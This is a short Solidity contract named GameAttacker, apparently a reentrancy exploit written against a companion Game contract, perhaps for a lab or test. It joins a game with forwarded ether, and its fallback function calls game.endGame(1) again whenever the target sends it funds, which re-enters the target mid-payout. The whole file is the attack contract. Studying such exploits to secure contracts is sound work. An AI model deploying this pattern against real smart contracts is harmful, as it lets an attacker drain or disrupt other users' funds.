// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "hardhat/console.sol";
import "./Game.sol";

contract GameAttacker {
    Game game;

    constructor(address gameAddress){
        game = Game(gameAddress);
    }

    function joinGame(uint _gameId) external payable {
        game.joinGame{value: msg.value}(_gameId);
    }

    fallback() external payable{
        game.endGame(1);
    }
}
